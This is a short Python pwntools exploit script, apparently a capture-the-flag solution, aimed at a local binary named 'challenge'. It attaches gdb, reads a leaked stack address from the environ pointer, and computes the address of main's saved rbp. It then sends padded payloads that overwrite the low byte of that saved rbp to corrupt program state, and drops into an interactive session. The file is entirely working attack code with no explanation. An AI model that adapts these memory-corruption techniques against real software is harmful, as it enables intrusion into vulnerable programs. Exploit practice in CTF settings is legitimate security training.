#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./challenge',checksec=False)
p = process()
gdb.attach(p,gdbscript='''
           b*read_int8+0x0019
           ''')
input()
p.sendlineafter(b'> ',b'3')
leak = int(p.recvline().strip(),16)
print("leak environ: ",hex(leak))
main_rbp = leak - 0x138
print("rbp: ",hex(main_rbp))
main_rbp = (main_rbp+9) & 0xff
payload = str(0x7B).encode().ljust(0x20,b'\x00')
payload += p8(main_rbp)
p.sendafter(b'> ',payload)

main_rbp = (main_rbp+10) & 0xff
payload = str(0x0B).encode().ljust(0x20, b'\x00')
payload += p8(main_rbp)

p.sendafter(b'> ', payload)
payload = str(0x1).encode().ljust(0x20, b'\x00')
payload += p64(main_rbp)[:1]
p.sendafter(b'> ',payload)


p.interactive()
